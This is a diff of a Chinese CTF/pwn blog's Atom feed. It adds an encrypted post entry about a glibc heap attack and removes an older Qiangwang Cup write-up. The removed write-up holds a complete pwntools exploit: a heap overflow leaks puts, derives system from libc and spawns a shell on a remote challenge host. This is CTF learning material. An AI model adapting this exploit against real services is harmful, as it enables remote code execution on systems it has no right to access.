@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://whali3n51.github.io/"/>
-  <updated>2020-03-11T03:49:37.894Z</updated>
+  <updated>2020-03-11T06:20:13.850Z</updated>
   <id>http://whali3n51.github.io/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>glibc2.29和glibc2.30下的新的利用方式--tcache_stashing_unlink_attack_plus</title>
+    <link href="http://whali3n51.github.io/2020/03/11/glibc2-29%E5%92%8Cglibc2-30%E4%B8%8B%E7%9A%84%E6%96%B0%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F-tcache-stashing-unlink-attack-plus/"/>
+    <id>http://whali3n51.github.io/2020/03/11/glibc2-29%E5%92%8Cglibc2-30%E4%B8%8B%E7%9A%84%E6%96%B0%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F-tcache-stashing-unlink-attack-plus/</id>
+    <published>2020-03-11T06:11:56.000Z</published>
+    <updated>2020-03-11T06:20:13.850Z</updated>
+    
+    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章。</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="d3f8cd2b98d07e8eeb2ff1bfbcbf5d9f0188eec858aa095dffb8bcdab47a2f7e">f45bd194942de3a6ddac7c3126f4a568</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
+    
+    <summary type="html">
+    
+      这是一篇加密文章，内容可能是个人情感宣泄或者收费技术。如果你确实想看，请与我联系。
+    
+    </summary>
+    
+    
+      <category term="pwn学习" scheme="http://Whali3n51.github.io/categories/pwn%E5%AD%A6%E4%B9%A0/"/>
+    
+    
+      <category term="tcache_stashing_unlink_attack_plus" scheme="http://Whali3n51.github.io/tags/tcache-stashing-unlink-attack-plus/"/>
+    
+  </entry>
   
   <entry>
     <title>xctf_高校战役公益赛</title>
@@ -38,11 +61,11 @@
       <category term="Writeup" scheme="http://Whali3n51.github.io/categories/Writeup/"/>
     
     
+      <category term="house of orange" scheme="http://Whali3n51.github.io/tags/house-of-orange/"/>
+    
       <category term="VMpwn" scheme="http://Whali3n51.github.io/tags/VMpwn/"/>
     
       <category term="SROP" scheme="http://Whali3n51.github.io/tags/SROP/"/>
-    
-      <category term="house of orange" scheme="http://Whali3n51.github.io/tags/house-of-orange/"/>
     
       <category term="沙盒" scheme="http://Whali3n51.github.io/tags/%E6%B2%99%E7%9B%92/"/>
     
@@ -291,9 +314,9 @@
       <category term="Writeup" scheme="http://Whali3n51.github.io/categories/Writeup/"/>
     
     
-      <category term="UAF" scheme="http://Whali3n51.github.io/tags/UAF/"/>
-    
       <category term="house of orange" scheme="http://Whali3n51.github.io/tags/house-of-orange/"/>
+    
+      <category term="UAF" scheme="http://Whali3n51.github.io/tags/UAF/"/>
     
   </entry>
   
@@ -535,32 +558,6 @@
     
     
       <category term="Usnsorted bin attack" scheme="http://Whali3n51.github.io/tags/Usnsorted-bin-attack/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>强网杯：强网先锋_AP_Pwn  writeup</title>
-    <link href="http://whali3n51.github.io/2019/05/31/%E5%BC%BA%E7%BD%91%E6%9D%AF%EF%BC%9A%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B_AP_Pwn%20%20writeup/"/>
-    <id>http://whali3n51.github.io/2019/05/31/%E5%BC%BA%E7%BD%91%E6%9D%AF%EF%BC%9A%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B_AP_Pwn%20%20writeup/</id>
-    <published>2019-05-31T05:07:00.000Z</published>
-    <updated>2020-01-08T07:09:37.220Z</updated>
-    
-    <content type="html"><![CDATA[<p>谈谈强网杯的感受吧，感觉被大佬们上了一课，也让我自己看到自己越来越菜了，这也是我做的第一个pwn题。大佬们说这题可以house of orange解出，对不起，我太菜，根本不会，我还需要多加学习。话不多说，详细的讲一下这个pwn吧。<br>首先拿到程序，进行一个检查看开了什么保护。<br><a href="https://i.loli.net/2019/05/31/5cf0b66d5798f30217.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/05/31/5cf0b66d5798f30217.png" alt=""></a><br>很绝望，全绿，像帽子一样，绿的发慌。但是没办法，因为主办方说这题是送分题，然后开始分析程序。<br>首先运行程序<br><a href="https://i.loli.net/2019/05/31/5cf0b675774ff55619.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/05/31/5cf0b675774ff55619.png" alt=""></a><br>显而易见，程序是一个模拟售票的程序，有三个功能。<br>1．    是卖票<br>2．    是查询卖票信息<br>3．    是改变票的信息<br>程序流程就是这么个简单。<br>然后我们进IDA看一眼<br><a href="https://i.loli.net/2019/05/31/5cf0b67d67a2695868.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/05/31/5cf0b67d67a2695868.png" alt=""></a><br>进到Get函数看一眼。分析它的伪代码<br>一个函数的意思是首先创建一个结构体，结构体如下：<br><a href="https://i.loli.net/2019/05/31/5cf0b683d758725900.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/05/31/5cf0b683d758725900.png" alt=""></a><br>改结构体的buf是一个指针<br><a href="https://i.loli.net/2019/05/31/5cf0b68b7633a15611.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/05/31/5cf0b68b7633a15611.png" alt=""></a><br>这个size是有我们定的，然后这里读进去的数为size-1然后第size位为零。然后就没有其他的什么了。函数很安全，没什么漏洞，关键点是在于他把puts的函数地址放到了堆上。然后就没有其他的情况了。<br>再去看看open函数<br><a href="https://i.loli.net/2019/05/31/5cf0b6953e47f64371.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/05/31/5cf0b6953e47f64371.png" alt=""></a><br>这个函数看起来也很安全，无非就是根据输入的ID输出相应buf所指向的地方。输出的函数使用的时堆上的puts地址。<br>然后再Change函数<br><a href="https://i.loli.net/2019/05/31/5cf0b6a074b7843148.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/05/31/5cf0b6a074b7843148.png" alt=""></a><br>分析程序发现这里有堆溢出。这里的read是将我们输入的值放到我们Get函数的buf所指向的堆上。而且读入的大小是我们自己觉得。这里就出现堆溢出了，当我们读入的大小大于我们Get函数开辟的大小的时候，我们就能实现堆溢出了。<br>知道了堆溢出，我们现在需要思考我们将这个堆溢出利用在哪里。<br>我们现在只能想的是，利用堆溢出控制一个指针，然后通过这个指针去实现任意位置的读和写。好了，我们这里有思路了，但是我们还有一点需要思考的是，这一题开了PIE,我们需要通过覆盖got表的情况已经不存在了。所以我们这里还需要思考怎么区利用任意位置读和写，我们前面发现程序将puts的地址放在了堆上面，而且输出的时候，是直接使用的这个地址。好了，现在我们有思路了。我们就需要利用堆溢出来改写结构体中的各个指针的值。<br>我现在就直接给出exp,关于各个堆块之间的大小需要用到动调，我这里就不演示了，动调之前先进IDA把init函数中的alarm函数给nop掉。关于不懂得可以私信我，我们可以相互交流下。<br><a href="https://i.loli.net/2019/05/31/5cf0b6aa1040322491.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/05/31/5cf0b6aa1040322491.png" alt=""></a><br>Exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process('./task_main')</span></span><br><span class="line">p=remote(<span class="string">'117.78.48.182'</span>,<span class="number">31156</span>)</span><br><span class="line">elf=ELF(<span class="string">'./task_main'</span>)</span><br><span class="line">libc=ELF(<span class="string">'libc6_2.23-0ubuntu10_amd64.so'</span>)</span><br><span class="line"><span class="comment">#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Choice &gt;&gt; \n'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"The length of my owner's name:\n"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvline(<span class="string">"Give me my owner's name:\n"</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Choice &gt;&gt; \n'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Please tell me which tickets would you want to open?\n'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Choice &gt;&gt; \n'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Please tell me which tickets would you want to change it's owner's name?\n"</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">"The length of my owner's name:\n"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"Give me my owner's name:\n"</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"><span class="comment">#创建堆块</span></span><br><span class="line">get(<span class="number">0x20</span>,<span class="string">"123456"</span>)</span><br><span class="line">get(<span class="number">0x20</span>,<span class="string">"dudududu"</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="number">0x28</span>*<span class="string">'a'</span>+p64(<span class="number">0x21</span>)+<span class="string">'\x18'</span> <span class="comment">#过pie</span></span><br><span class="line">change(<span class="number">0</span>,len(payload)+<span class="number">1</span>,payload) <span class="comment">#堆溢出改写chunk1的buf指向puts地址</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)<span class="comment">#泄露puts地址</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"I'm a magic tickets.I will tell you who is my owner!\n"</span>)</span><br><span class="line">index=p.recv(<span class="number">6</span>)</span><br><span class="line">puts_addr=u64(index.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) <span class="comment">#得到puts的真实地址，从而得到libc版本</span></span><br><span class="line">base=puts_addr-libc.symbols[<span class="string">'puts'</span>] <span class="comment">#得到libc的基址</span></span><br><span class="line">system_addr=libc.symbols[<span class="string">'system'</span>]+base <span class="comment">#得到system地址</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'puts:'</span>+hex(puts_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'base:'</span>+hex(base)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'system_addr:'</span>+hex(system_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#得到chunk0，接下来就是如何去执行system了</span></span><br><span class="line"><span class="comment">#首先泄露出一个chunk的真实地址</span></span><br><span class="line">payload=<span class="number">0x28</span>*<span class="string">'a'</span>+p64(<span class="number">0x21</span>)+<span class="string">'\x10'</span></span><br><span class="line">change(<span class="number">0</span>,len(payload)+<span class="number">1</span>,payload)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"I'm a magic tickets.I will tell you who is my owner!\n"</span>)</span><br><span class="line">index=p.recv(<span class="number">6</span>)</span><br><span class="line">chunk0_addr=u64(index.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#将puts地址变为system_addr</span></span><br><span class="line"><span class="keyword">print</span> hex(chunk0_addr)</span><br><span class="line">payload=<span class="number">0x28</span>*<span class="string">'a'</span>+p64(<span class="number">0x21</span>)+p64(chunk0_addr)+p64(system_addr)</span><br><span class="line">change(<span class="number">0</span>,len(payload)+<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#传入/bin/sh</span></span><br><span class="line">payload=<span class="string">"/bin/sh\x00"</span></span><br><span class="line">change(<span class="number">0</span>,len(payload)+<span class="number">1</span>,payload)</span><br><span class="line"><span class="comment">#执行system</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;谈谈强网杯的感受吧，感觉被大佬们上了一课，也让我自己看到自己越来越菜了，这也是我做的第一个pwn题。大佬们说这题可以house of orange解出，对不起，我太菜，根本不会，我还需要多加学习。话不多说，详细的讲一下这个pwn吧。&lt;br&gt;首先拿到程序，进行一个检查看开了什
-      
-    
-    </summary>
-    
-    
-      <category term="Writeup" scheme="http://Whali3n51.github.io/categories/Writeup/"/>
-    
-    
-      <category term="修改指针" scheme="http://Whali3n51.github.io/tags/%E4%BF%AE%E6%94%B9%E6%8C%87%E9%92%88/"/>
     
   </entry>
   
